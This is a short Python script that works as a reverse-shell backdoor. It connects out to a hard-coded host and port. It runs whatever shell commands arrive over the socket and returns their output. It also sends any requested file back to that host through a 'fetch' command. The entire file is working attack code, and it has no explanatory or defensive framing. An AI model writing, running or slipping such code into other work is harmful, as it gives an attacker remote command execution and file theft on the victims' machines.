import os
import subprocess
import socket
import sys

def connecttohost():
	global socks
	socks= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	global host
	host = '192.168.0.106'
	global port
	port = 666
	socks.connect((host , port))
	
connecttohost()

flag = 1

while  flag :
	data = socks.recv(102400)
	data = data.decode('utf-8')
	
	if data[:2]=='cd':
		os.chdir(data[3:])

	if data == 'fetch' :
		fname=socks.recv(102400)
		fname=fname.decode('utf-8')
		fsend = open(fname , 'rb')
		count = 1
		leng = fsend.read(102400)
		while leng :
			socks.send(leng)
			count = count + 1
			leng = fsend.read(102400)
		fsend.close()
		socks.close()
		connecttohost()			
			
	if len(data)>0 and data != 'fetch' and data != 'cd' :
		out = subprocess.getoutput(data)
		socks.send(out.encode('utf-8'))
		
	if data=='quit':
		flag = 0
		
socks.close()
sys.exit(0)
